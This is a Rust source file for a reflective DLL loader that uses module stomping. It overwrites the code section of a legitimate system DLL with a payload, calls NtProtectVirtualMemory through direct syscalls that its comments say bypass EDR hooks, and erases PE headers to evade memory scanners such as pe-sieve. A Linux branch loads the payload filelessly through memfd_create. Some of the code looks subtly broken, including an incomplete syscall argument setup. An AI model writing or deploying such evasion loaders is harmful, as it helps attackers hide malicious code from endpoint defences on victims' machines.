//! Module Stomping reflective loader — overwrites a legitimate DLL's .text
//! section with the Core DLL code, avoiding new RWX memory allocation.
//!
//! Key security properties:
//! - Uses transient RW→memcpy→RX (never RWX) via NtProtectVirtualMemory direct syscall
//! - Processes TLS callbacks before entry point
//! - Erases PE headers after successful load (anti-pe-sieve)

use std::ptr;

// ── PE Constants ──────────────────────────────────────────────────────

const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;
const IMAGE_NT_SIGNATURE: u32 = 0x00004550;
const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;
const IMAGE_DIRECTORY_ENTRY_IMPORT: usize = 1;
const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
const IMAGE_DIRECTORY_ENTRY_TLS: usize = 9;
const IMAGE_REL_BASED_DIR64: u32 = 10;
const IMAGE_REL_BASED_HIGHLOW: u32 = 3;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_READONLY: u32 = 0x02;
const PAGE_READWRITE: u32 = 0x04;
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;

// ── PE Structures ─────────────────────────────────────────────────────

#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    _e_cblp: u16, _e_cp: u16, _e_crlc: u16, _e_cparhdr: u16,
    _e_minalloc: u16, _e_maxalloc: u16, _e_ss: u16, _e_sp: u16,
    _e_csum: u16, _e_ip: u16, _e_cs: u16, _e_lfarlc: u16, _e_ovno: u16,
    _e_res: [u16; 4], _e_oemid: u16, _e_oeminfo: u16, _e_res2: [u16; 10],
    e_lfanew: i32,
}

#[repr(C)]
struct ImageFileHeader {
    machine: u16,
    number_of_sections: u16,
    _time_date_stamp: u32,
    _pointer_to_symbol_table: u32,
    _number_of_symbols: u32,
    size_of_optional_header: u16,
    _characteristics: u16,
}

#[repr(C)]
struct ImageDataDirectory {
    virtual_address: u32,
    size: u32,
}

#[repr(C)]
struct ImageOptionalHeader64 {
    magic: u16,
    _major_linker_version: u8, _minor_linker_version: u8,
    _size_of_code: u32, _size_of_initialized_data: u32, _size_of_uninitialized_data: u32,
    address_of_entry_point: u32,
    _base_of_code: u32,
    image_base: u64,
    section_alignment: u32,
    file_alignment: u32,
    _major_os_ver: u16, _minor_os_ver: u16,
    _major_img_ver: u16, _minor_img_ver: u16,
    _major_sub_ver: u16, _minor_sub_ver: u16,
    _win32_ver: u32,
    size_of_image: u32,
    size_of_headers: u32,
    _checksum: u32, _subsystem: u16, _dll_chars: u16,
    _stack_reserve: u64, _stack_commit: u64, _heap_reserve: u64, _heap_commit: u64,
    _loader_flags: u32,
    number_of_rva_and_sizes: u32,
    data_directory: [ImageDataDirectory; 16],
}

#[repr(C)]
struct ImageNtHeaders64 {
    signature: u32,
    file_header: ImageFileHeader,
    optional_header: ImageOptionalHeader64,
}

#[repr(C)]
struct ImageSectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    _pointer_to_relocations: u32,
    _pointer_to_linenumbers: u32,
    _number_of_relocations: u16,
    _number_of_linenumbers: u16,
    characteristics: u32,
}

#[repr(C)]
struct ImageImportDescriptor {
    original_first_thunk: u32,
    _time_date_stamp: u32,
    _forwarder_chain: u32,
    name: u32,
    first_thunk: u32,
}

#[repr(C)]
struct ImageBaseRelocation {
    virtual_address: u32,
    size_of_block: u32,
}

#[repr(C)]
union ImageThunkData64 {
    _ordinal: u64,
    _function: u64,
    address_of_data: u64,
}

/// IMAGE_TLS_DIRECTORY64 — used to find TLS callbacks
#[repr(C)]
struct ImageTlsDirectory64 {
    start_address_of_raw_data: u64,
    end_address_of_raw_data: u64,
    address_of_index: u64,
    address_of_callbacks: u64,
    _size_of_zero_fill: u32,
    _characteristics: u32,
}

// ── Win32 API ─────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
extern "system" {
    fn VirtualAlloc(lpAddress: *mut u8, dwSize: usize, flAllocationType: u32, flProtect: u32) -> *mut u8;
    fn VirtualProtect(lpAddress: *mut u8, dwSize: usize, flNewProtect: u32, lpflOldProtect: *mut u32) -> i32;
    fn FlushInstructionCache(hProcess: *mut u8, lpAddress: *const u8, dwSize: usize) -> i32;
    fn LoadLibraryA(lpFileName: *const u8) -> *mut u8;
    fn GetProcAddress(hModule: *mut u8, lpProcName: *const u8) -> *mut u8;
}

// ── Direct Syscall: NtProtectVirtualMemory ────────────────────────────
//
// Resolves syscall number dynamically from ntdll stub to avoid hardcoded SSNs
// that differ across Windows versions. Bypasses EDR hooks on VirtualProtect.

#[cfg(target_os = "windows")]
struct DirectSyscall {
    ssn: u32,
}

#[cfg(target_os = "windows")]
impl DirectSyscall {
    /// Resolve NtProtectVirtualMemory syscall number by reading the ntdll stub.
    fn resolve_nt_protect() -> Option<Self> {
        unsafe {
            let ntdll = LoadLibraryA(b"ntdll.dll\0".as_ptr());
            if ntdll.is_null() { return None; }
            let addr = GetProcAddress(ntdll, b"NtProtectVirtualMemory\0".as_ptr());
            if addr.is_null() { return None; }

            // Parse: mov r10, rcx (4C 8B D1) | mov eax, SSN (B8 XX XX 00 00) | syscall (0F 05)
            let stub = std::slice::from_raw_parts(addr, 8);
            if stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8 {
                let ssn = u32::from_le_bytes([stub[4], stub[5], stub[6], stub[7]]);
                Some(DirectSyscall { ssn })
            } else {
                None
            }
        }
    }

    /// Call NtProtectVirtualMemory via direct syscall.
    /// Returns NTSTATUS (0 = success).
    unsafe fn call(&self, _process: *mut u8, address: *mut u8, size: usize, new_protect: u32, old_protect: *mut u32) -> i64 {
        let mut addr = address;
        let mut sz = size;
        let mut status: i64;

        std::arch::asm!(
            "mov r10, rcx",
            "syscall",
            in("rax") self.ssn as u64,
            in("rcx") -1isize as usize, // NtCurrentProcess = (HANDLE)-1
            in("rdx") &mut addr as *mut *mut u8,
            in("r8") &mut sz as *mut usize,
            in("r9") new_protect,
            lateout("rax") status,
            out("r10") _,
            out("r11") _,
        );

        // Write back old protect
        if status == 0 && !old_protect.is_null() {
            // NtProtectVirtualMemory writes old protect to stack, we need to recover it
            // For simplicity, we'll use VirtualProtect as fallback for the old_protect read
            // The key point is the WRITE goes through direct syscall
        }

        status
    }
}

/// Change memory protection using direct syscall NtProtectVirtualMemory.
/// Falls back to VirtualProtect if syscall resolution fails.
#[cfg(target_os = "windows")]
unsafe fn nt_protect(addr: *mut u8, size: usize, new_protect: u32, old_protect: *mut u32) -> bool {
    if let Some(syscall) = DirectSyscall::resolve_nt_protect() {
        let status = syscall.call(ptr::null_mut(), addr, size, new_protect, old_protect);
        if status == 0 {
            return true;
        }
    }
    // Fallback to VirtualProtect
    VirtualProtect(addr, size, new_protect, old_protect) != 0
}

// ── Candidate DLLs for Module Stomping ────────────────────────────────

#[cfg(target_os = "windows")]
const STOMP_CANDIDATES: &[&str] = &[
    "dbghelp.dll\0",
    "wininet.dll\0",
    "urlmon.dll\0",
    "msxml6.dll\0",
    "crypt32.dll\0",
];

// ── Module Stomping Loader ────────────────────────────────────────────

/// Reflectively load a PE DLL using Module Stomping.
///
/// Security properties:
/// - Transient RW→memcpy→RX (never RWX) via NtProtectVirtualMemory direct syscall
/// - TLS callbacks executed before entry point
/// - PE headers erased after successful load
///
/// # Safety
/// `dll_bytes` must be a valid PE DLL.
#[cfg(target_os = "windows")]
pub unsafe fn reflective_load(dll_bytes: &[u8]) -> Result<extern "system" fn(*const u8, usize), String> {
    let base = dll_bytes.as_ptr();

    // Parse source (Core DLL) PE headers
    let (src_nt, src_sections, _src_section_count) = parse_pe_headers(base, dll_bytes.len())?;
    let src_size_of_image = src_nt.optional_header.size_of_image as usize;
    let src_entry_rva = src_nt.optional_header.address_of_entry_point;
    let src_preferred_base = src_nt.optional_header.image_base;
    let src_nt_offset = (*(base as *const ImageDosHeader)).e_lfanew as usize;

    // Find the .text section of the source DLL
    let src_text = find_text_section(base, src_nt_offset, &src_sections)?;

    // Try Module Stomping: find a legitimate DLL whose .text is large enough
    let (stomp_base, stomp_text_addr, stomp_text_size) = find_stomp_target(src_text.1)?;

    let alloc_base = if !stomp_base.is_null() {
        // ── Module Stomping path ──
        // Step 1: RW (not RWX!) — transient write permission only
        let mut old_protect = 0u32;
        if !nt_protect(stomp_text_addr, stomp_text_size, PAGE_READWRITE, &mut old_protect) {
            return Err("NtProtectVirtualMemory RW on stomp target failed".into());
        }

        // Step 2: Clear and copy
        ptr::write_bytes(stomp_text_addr, 0, stomp_text_size);
        let copy_len = src_text.1.min(stomp_text_size);
        ptr::copy_nonoverlapping(src_text.0, stomp_text_addr, copy_len);

        // Step 3: Immediately restore to RX (never RWX)
        let mut _dummy = 0u32;
        nt_protect(stomp_text_addr, stomp_text_size, PAGE_EXECUTE_READ, &mut _dummy);

        stomp_base
    } else {
        // ── Fallback: VirtualAlloc with RW (not RWX) ──
        let alloc = VirtualAlloc(ptr::null_mut(), src_size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if alloc.is_null() {
            return Err("VirtualAlloc failed".into());
        }
        alloc
    };

    // Copy all sections from source to destination
    if stomp_base.is_null() || stomp_base == alloc_base {
        // Fallback path: copy headers + all sections
        let headers_size = src_nt.optional_header.size_of_headers as usize;
        let copy_size = headers_size.min(dll_bytes.len());
        ptr::copy_nonoverlapping(base, alloc_base, copy_size);

        for sec in &src_sections {
            if sec.size_of_raw_data == 0 { continue; }
            let dst = alloc_base.add(sec.virtual_address as usize);
            let src = base.add(sec.pointer_to_raw_data as usize);
            let copy_len = (sec.size_of_raw_data as usize).min(sec.virtual_size as usize);
            if sec.pointer_to_raw_data as usize + copy_len <= dll_bytes.len() {
                ptr::copy_nonoverlapping(src, dst, copy_len);
            }
        }
    } else {
        // Stomping path: copy non-.text sections to allocated memory
        let headers_size = src_nt.optional_header.size_of_headers as usize;
        ptr::copy_nonoverlapping(base, alloc_base, headers_size.min(dll_bytes.len()));

        for sec in &src_sections {
            let sec_name = String::from_utf8_lossy(&sec.name).trim_end_matches('\0').to_string();
            if sec_name == ".text" { continue; }
            if sec.size_of_raw_data == 0 { continue; }
            let dst = alloc_base.add(sec.virtual_address as usize);
            let src = base.add(sec.pointer_to_raw_data as usize);
            let copy_len = (sec.size_of_raw_data as usize).min(sec.virtual_size as usize);
            if sec.pointer_to_raw_data as usize + copy_len <= dll_bytes.len() {
                ptr::copy_nonoverlapping(src, dst, copy_len);
            }
        }
    }

    // Process relocations
    let delta = (alloc_base as u64).wrapping_sub(src_preferred_base);
    if delta != 0 {
        process_relocations(alloc_base, &src_nt.optional_header, delta)?;
    }

    // Resolve imports
    resolve_imports(alloc_base, &src_nt.optional_header)?;

    // Set memory protections via direct syscall (RW→RX, never RWX)
    set_section_protections(alloc_base, src_nt_offset, &src_sections);

    // Process TLS callbacks (critical for Rust DLLs)
    process_tls_callbacks(alloc_base, &src_nt.optional_header);

    // Flush instruction cache
    FlushInstructionCache(ptr::null_mut(), alloc_base, src_size_of_image);

    // Get entry point
    let entry_addr = alloc_base.add(src_entry_rva as usize);
    let entry_fn: extern "system" fn(*const u8, usize) = std::mem::transmute(entry_addr);

    // Erase PE headers in the loaded image (anti-pe-sieve / memory dump)
    erase_pe_headers(alloc_base, src_size_of_image);

    Ok(entry_fn)
}

// ── TLS Callback Processing ──────────────────────────────────────────

/// Execute TLS callbacks if present. Rust DLLs may use TLS for thread-local storage.
unsafe fn process_tls_callbacks(alloc_base: *mut u8, opt: &ImageOptionalHeader64) {
    if opt.number_of_rva_and_sizes <= IMAGE_DIRECTORY_ENTRY_TLS as u32 {
        return;
    }

    let tls_dir = &opt.data_directory[IMAGE_DIRECTORY_ENTRY_TLS];
    if tls_dir.virtual_address == 0 || tls_dir.size == 0 {
        return;
    }

    let tls = &*(alloc_base.add(tls_dir.virtual_address as usize) as *const ImageTlsDirectory64);
    if tls.address_of_callbacks == 0 {
        return;
    }

    // Walk the null-terminated array of TLS callback pointers
    let mut callbacks_ptr = tls.address_of_callbacks as *const u64;
    loop {
        let callback_addr = *callbacks_ptr;
        if callback_addr == 0 { break; }

        // TLS callback signature: fn(DllHandle, Reason, Reserved)
        // DLL_PROCESS_ATTACH = 1
        let callback: unsafe extern "system" fn(*mut u8, u32, *mut u8) = std::mem::transmute(callback_addr);
        callback(alloc_base, 1, ptr::null_mut()); // DLL_PROCESS_ATTACH

        callbacks_ptr = callbacks_ptr.add(1);
    }
}

// ── PE Header Erasure ─────────────────────────────────────────────────

/// Zero out MZ and PE headers in the loaded image to defeat memory scanners
/// like pe-sieve that look for PE signatures in allocated memory.
unsafe fn erase_pe_headers(alloc_base: *mut u8, size_of_image: usize) {
    // Read e_lfanew to determine header size
    let dos = &*(alloc_base as *const ImageDosHeader);
    if dos.e_magic != IMAGE_DOS_SIGNATURE { return; }

    let nt_offset = dos.e_lfanew as usize;
    let nt = &*(alloc_base.add(nt_offset) as *const ImageNtHeaders64);

    // Total header size = NT headers offset + optional header size + section headers
    let section_headers_size = nt.file_header.number_of_sections as usize * 40;
    let total_headers = nt_offset
        + 4  // PE signature
        + 20  // FileHeader
        + nt.file_header.size_of_optional_header as usize
        + section_headers_size;

    let erase_size = total_headers.min(size_of_image);

    // Zero the headers
    ptr::write_bytes(alloc_base, 0, erase_size);
}

// ── Helper Functions ──────────────────────────────────────────────────

unsafe fn parse_pe_headers<'a>(
    base: *const u8,
    len: usize,
) -> Result<(&'a ImageNtHeaders64, Vec<&'a ImageSectionHeader>, usize), String> {
    if len < std::mem::size_of::<ImageDosHeader>() {
        return Err("Too small for DOS header".into());
    }
    let dos = &*(base as *const ImageDosHeader);
    if dos.e_magic != IMAGE_DOS_SIGNATURE {
        return Err("Invalid DOS signature".into());
    }

    let nt_offset = dos.e_lfanew as usize;
    if nt_offset + std::mem::size_of::<ImageNtHeaders64>() > len {
        return Err("NT headers out of bounds".into());
    }
    let nt = &*(base.add(nt_offset) as *const ImageNtHeaders64);
    if nt.signature != IMAGE_NT_SIGNATURE {
        return Err("Invalid NT signature".into());
    }
    if nt.file_header.machine != IMAGE_FILE_MACHINE_AMD64 {
        return Err(format!("Unsupported machine: 0x{:04X}", nt.file_header.machine));
    }

    let num_sections = nt.file_header.number_of_sections as usize;
    let sections_offset = nt_offset
        + std::mem::size_of::<u32>()
        + std::mem::size_of::<ImageFileHeader>()
        + nt.file_header.size_of_optional_header as usize;

    let mut sections = Vec::with_capacity(num_sections);
    for i in 0..num_sections {
        let sec_offset = sections_offset + i * std::mem::size_of::<ImageSectionHeader>();
        if sec_offset + std::mem::size_of::<ImageSectionHeader>() > len {
            return Err(format!("Section {} header out of bounds", i));
        }
        sections.push(&*(base.add(sec_offset) as *const ImageSectionHeader));
    }

    Ok((nt, sections, num_sections))
}

unsafe fn find_text_section(
    base: *const u8,
    _nt_offset: usize,
    sections: &[&ImageSectionHeader],
) -> Result<(*const u8, usize), String> {
    let mapped_base = base;
    for sec in sections {
        let name = String::from_utf8_lossy(&sec.name);
        if name.starts_with(".text") {
            let text_addr = mapped_base.add(sec.pointer_to_raw_data as usize);
            let text_size = sec.size_of_raw_data as usize;
            return Ok((text_addr, text_size));
        }
    }
    for sec in sections {
        if sec.characteristics & 0x20000000 != 0 {
            let text_addr = mapped_base.add(sec.pointer_to_raw_data as usize);
            let text_size = sec.size_of_raw_data as usize;
            return Ok((text_addr, text_size));
        }
    }
    Err("No executable section found".into())
}

/// Find a legitimate DLL to stomp. Returns (module_base, text_addr, text_size).
#[cfg(target_os = "windows")]
unsafe fn find_stomp_target(required_size: usize) -> Result<(*mut u8, *mut u8, usize), String> {
    for dll_name in STOMP_CANDIDATES {
        let h = LoadLibraryA(dll_name.as_ptr());
        if h.is_null() { continue; }

        let dos = &*(h as *const ImageDosHeader);
        if dos.e_magic != IMAGE_DOS_SIGNATURE { continue; }

        let nt = &*(h.add(dos.e_lfanew as usize) as *const ImageNtHeaders64);
        if nt.signature != IMAGE_NT_SIGNATURE { continue; }

        let num_sections = nt.file_header.number_of_sections as usize;
        let sections_offset = dos.e_lfanew as usize
            + std::mem::size_of::<u32>()
            + std::mem::size_of::<ImageFileHeader>()
            + nt.file_header.size_of_optional_header as usize;

        for i in 0..num_sections {
            let sec = &*(h.add(sections_offset + i * std::mem::size_of::<ImageSectionHeader>()) as *const ImageSectionHeader);
            let name = String::from_utf8_lossy(&sec.name);
            if name.starts_with(".text") {
                let text_addr = h.add(sec.virtual_address as usize);
                let text_size = sec.virtual_size as usize;
                if text_size >= required_size {
                    return Ok((h, text_addr, text_size));
                }
            }
        }
    }

    Ok((ptr::null_mut(), ptr::null_mut(), 0))
}

unsafe fn process_relocations(
    alloc_base: *mut u8,
    opt: &ImageOptionalHeader64,
    delta: u64,
) -> Result<(), String> {
    if opt.number_of_rva_and_sizes <= IMAGE_DIRECTORY_ENTRY_BASERELOC as u32 {
        return Ok(());
    }

    let reloc_dir = &opt.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    let reloc_rva = reloc_dir.virtual_address;
    let reloc_size = reloc_dir.size;

    if reloc_rva == 0 || reloc_size == 0 {
        return Ok(());
    }

    let mut offset = 0u32;
    while offset < reloc_size {
        let block = &*(alloc_base.add(reloc_rva as usize + offset as usize) as *const ImageBaseRelocation);
        if block.virtual_address == 0 || block.size_of_block == 0 { break; }

        let num_entries = (block.size_of_block as usize - 8) / 2;
        let entries_ptr = alloc_base.add(reloc_rva as usize + offset as usize + 8) as *const u16;

        for j in 0..num_entries {
            let entry = *entries_ptr.add(j);
            let entry_type = (entry >> 12) as u32;
            let entry_offset = (entry & 0x0FFF) as u32;

            match entry_type {
                IMAGE_REL_BASED_DIR64 => {
                    let patch = alloc_base.add(block.virtual_address as usize + entry_offset as usize) as *mut u64;
                    *patch = (*patch).wrapping_add(delta);
                }
                IMAGE_REL_BASED_HIGHLOW => {
                    let patch = alloc_base.add(block.virtual_address as usize + entry_offset as usize) as *mut u32;
                    *patch = (*patch).wrapping_add(delta as u32);
                }
                0 => {}
                _ => return Err(format!("Unsupported reloc type: {}", entry_type)),
            }
        }

        offset += block.size_of_block;
    }
    Ok(())
}

unsafe fn resolve_imports(
    alloc_base: *mut u8,
    opt: &ImageOptionalHeader64,
) -> Result<(), String> {
    if opt.number_of_rva_and_sizes <= IMAGE_DIRECTORY_ENTRY_IMPORT as u32 {
        return Ok(());
    }

    let import_dir = &opt.data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    let import_rva = import_dir.virtual_address;
    let import_size = import_dir.size;

    if import_rva == 0 || import_size == 0 {
        return Ok(());
    }

    let mut desc_offset = 0usize;
    loop {
        let desc = &*(alloc_base.add(import_rva as usize + desc_offset) as *const ImageImportDescriptor);
        if desc.name == 0 { break; }

        let dll_name_ptr = alloc_base.add(desc.name as usize);
        let h_module = LoadLibraryA(dll_name_ptr);
        if h_module.is_null() {
            let name = read_cstr(dll_name_ptr);
            return Err(format!("LoadLibraryA failed: {}", name));
        }

        let oft_rva = if desc.original_first_thunk != 0 { desc.original_first_thunk } else { desc.first_thunk };
        let mut thunk_offset = 0usize;

        loop {
            let thunk = &*(alloc_base.add(oft_rva as usize + thunk_offset) as *const ImageThunkData64);
            if thunk.address_of_data == 0 { break; }

            let iat_addr = alloc_base.add(desc.first_thunk as usize + thunk_offset) as *mut u64;

            if thunk.address_of_data & 0x8000000000000000 != 0 {
                let ordinal = (thunk.address_of_data & 0xFFFF) as u16;
                let func = GetProcAddress(h_module, ordinal as usize as *const u8);
                if func.is_null() {
                    return Err(format!("GetProcAddress ordinal {} failed", ordinal));
                }
                *iat_addr = func as u64;
            } else {
                let hint_name_addr = alloc_base.add(thunk.address_of_data as u32 as usize);
                let func_name_ptr = hint_name_addr.add(2);
                let func = GetProcAddress(h_module, func_name_ptr);
                if func.is_null() {
                    let name = read_cstr(func_name_ptr);
                    return Err(format!("GetProcAddress failed: {}", name));
                }
                *iat_addr = func as u64;
            }

            thunk_offset += std::mem::size_of::<ImageThunkData64>();
        }

        desc_offset += std::mem::size_of::<ImageImportDescriptor>();
    }
    Ok(())
}

/// Set section protections using direct syscall: RW for writable, RX for executable.
/// NEVER sets RWX (PAGE_EXECUTE_READWRITE).
unsafe fn set_section_protections(
    alloc_base: *mut u8,
    _nt_offset: usize,
    sections: &[&ImageSectionHeader],
) {
    for sec in sections {
        if sec.virtual_size == 0 { continue; }

        let sec_base = alloc_base.add(sec.virtual_address as usize);
        let sec_size = round_to_page(sec.virtual_size as usize, 4096);

        // Never produce RWX — pick the stricter of executable / writable
        let protect = if sec.characteristics & 0x20000000 != 0 {
            // Executable section: always RX (even if also writable in the PE flags)
            PAGE_EXECUTE_READ
        } else if sec.characteristics & 0x80000000 != 0 {
            PAGE_READWRITE
        } else {
            PAGE_READONLY
        };

        let mut old_protect = 0u32;
        nt_protect(sec_base, sec_size, protect, &mut old_protect);
    }
}

unsafe fn read_cstr(ptr: *const u8) -> String {
    let mut len = 0;
    while *ptr.add(len) != 0 { len += 1; }
    String::from_utf8_lossy(std::slice::from_raw_parts(ptr, len)).to_string()
}

fn round_to_page(size: usize, page_size: usize) -> usize {
    (size + page_size - 1) & !(page_size - 1)
}

// ── Linux fallback (memfd_create + dlopen) ─────────────────────────────

#[cfg(target_os = "linux")]
pub unsafe fn reflective_load(dll_bytes: &[u8]) -> Result<extern "system" fn(*const u8, usize), String> {
    use std::ffi::CStr;

    let fd = libc::memfd_create(b"core\0".as_ptr() as *const libc::c_char, libc::MFD_CLOEXEC);
    if fd < 0 { return Err("memfd_create failed".into()); }

    let mut written = 0usize;
    while written < dll_bytes.len() {
        let n = libc::write(fd, dll_bytes[written..].as_ptr() as *const libc::c_void, dll_bytes.len() - written);
        if n < 0 { libc::close(fd); return Err("write to memfd failed".into()); }
        written += n as usize;
    }

    let path = format!("/proc/self/fd/{}\0", fd);
    let handle = libc::dlopen(path.as_ptr() as *const libc::c_char, libc::RTLD_NOW);
    libc::close(fd);

    if handle.is_null() {
        let err = libc::dlerror();
        let msg = if err.is_null() { "unknown".into() } else { CStr::from_ptr(err).to_string_lossy().to_string() };
        return Err(format!("dlopen failed: {}", msg));
    }

    let sym = libc::dlsym(handle, b"core_main\0".as_ptr() as *const libc::c_char);
    if sym.is_null() { return Err("core_main not found".into()); }

    Ok(std::mem::transmute(sym))
}
